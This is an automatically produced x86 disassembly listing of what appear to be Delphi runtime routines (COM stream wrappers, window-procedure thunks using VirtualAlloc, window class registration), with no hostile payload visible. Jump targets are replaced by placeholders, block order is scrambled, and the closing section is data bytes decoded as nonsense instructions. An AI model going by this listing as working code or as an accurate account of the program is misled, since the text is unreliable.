jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413de4
call sub_41a384
inc edi
dec esi
jne r-xdata
sub_41a3c0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413f80
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4032a0
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41a3e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a3c0
mov edx ebx
mov eax esi
call sub_41a3c0
pop esi
pop ebx
retn
sub_41a400
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41a3e4
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413de4
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41a45c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41a208
push ebx
push sub_41a230
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41a21c
push ebx
push sub_41a23c
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41a554
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407e18
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41a5ec
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_41a5ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413de4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407e18
test al al
jne r-xdata
sub_41a63c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404480
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407f9c
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
xor edx edx
mov eax ebx
call sub_41a7bc
mov edx esi
mov eax ebx
call sub_41a6c8
mov dl 0x1
mov eax ebx
call sub_41a7bc
sub_41a6dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413de4
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413d70
sub_41a718
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413e40
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413cd4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413e60
sub_41a76c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a708
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a6dc
mov cl 0x1
mov edx ebx
call sub_41a76c
inc edi
dec ebp
jne r-xdata
sub_41a7bc
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404310
mov edx esp
mov eax esi
call sub_403574
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a804
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a82c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a874
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403354
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a8b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a8d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a8f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a940
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov edx esi
call sub_41ab70
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41a9a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41ab70
mov edx ebx
mov eax esi
call sub_41ab64
sub_41a9ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41aa30
push ebx
push esi
push edi
call sub_40362c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a130
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41a3e4
jmp r-xdata
mov eax esi
call sub_413ecc
mov edx eax
mov eax edi
call sub_41ab70
lea eax [ edi + 0x50 ]
call sub_40d01c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
sub_41aa90
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41aabc
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41aad8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41aaf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413de4
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41ab70
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413cd4
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413de4
cmp ebp eax
jne r-xdata
sub_41abb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41a3e4
mov edx ebx
call sub_41a1b4
sub_41abdc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ac24
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4032a0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41ac5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41acab
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41acc4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41ad13
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ad2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41ad96
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41adb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41adf9
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415f00
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41ae14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405754
xor eax eax
push ebp
push sub_41b001
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41afda
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41afc9
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b008
lea eax [ ebp + 0xc ]
call sub_4056e0
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41b044
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41b0a7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b0d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4141e4
mov edi eax
xor eax eax
push ebp
push sub_41b12d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b134
mov eax [ rw-data ]
call sub_414248
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413de4
call sub_4032a0
inc esi
dec ebx
jne r-xdata
sub_41b14c
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41b174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_41b14c
lea eax [ esi + 0x5 ]
call sub_41b16c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41b16c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41b230
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406b50
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b174
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41b2e4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41b20c
sub_41b30c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b3b0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3b7
retn
mov eax [ rw-data ]
call sub_4135d4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41b0d8
xor edx edx
xor eax eax
call sub_416e00
mov eax rw-data
call sub_40d01c
call sub_405e10
lea eax [ eax + 0xc ]
call sub_40d01c
mov eax rw-data
call sub_40d01c
mov eax rw-data
call sub_4056e0
mov eax sub_41b144
call sub_40557c
mov eax rw-data
call sub_40d01c
call sub_4199fc
mov eax rw-data
call sub_40d01c
mov eax rw-data
call sub_4056e0
sub_41b3bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b445
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b44c
retn
call sub_4199c8
mov eax sub_41b144
call sub_405574
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cd5c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4056f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ed0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41408c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41408c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41b450
inc esi
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] dh
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] bh
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] ah
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] ch
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] dl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
